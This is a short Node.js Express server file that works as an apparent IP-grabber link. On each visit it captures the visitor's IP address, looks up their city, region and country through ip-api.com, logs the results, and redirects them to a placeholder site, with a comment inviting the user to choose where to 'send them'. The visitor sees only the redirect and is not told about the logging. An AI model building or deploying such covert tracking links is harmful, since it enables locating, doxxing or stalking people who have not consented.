// server.js
const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const locationData = geoRes.data;

    console.log(`User IP: ${ip}`);
    console.log(`Location: ${locationData.city}, ${locationData.regionName}, ${locationData.country}`);

    res.redirect('https://example.com'); // Change this to where you want to send them
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
    res.redirect('https://example.com');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
